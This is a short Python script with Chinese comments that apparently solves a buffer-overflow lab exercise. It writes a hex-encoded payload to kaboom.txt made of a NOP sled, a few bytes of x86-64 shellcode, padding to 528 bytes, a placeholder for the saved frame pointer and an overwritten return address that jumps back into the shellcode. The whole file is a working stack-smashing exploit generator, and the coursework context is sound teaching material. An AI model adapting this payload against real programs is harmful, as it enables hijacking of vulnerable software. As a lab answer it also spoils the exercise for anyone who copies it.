# 这个脚本用来生成kaboom.txt



buf_addr = 0x5567eda0  # shellcode 的实际地址


shellcode = (
    b"\x48\xc7\xc0\xbf\x3f\xef\x31"     
    b"\x48\x8d\x6c\x24\x10"                              
    b"\x68\x65\x15\x40\x00"
    b"\xc3"                                     
)

payload = b"\x90" * 400                 # NOP sled
payload += shellcode                       # shellcode
payload += b"\x90" * (528 - len(payload))  # 填满 buffer 到 528 字节
payload += b"\x90" * 8                        # saved RBP 占位
payload += buf_addr.to_bytes(8, "little") # 覆盖返回地址，跳到 shellcode

with open("kaboom.txt", "w") as f:
    hexstring = " ".join(f"{b:02x}" for b in payload)
    f.write(hexstring + "\n")
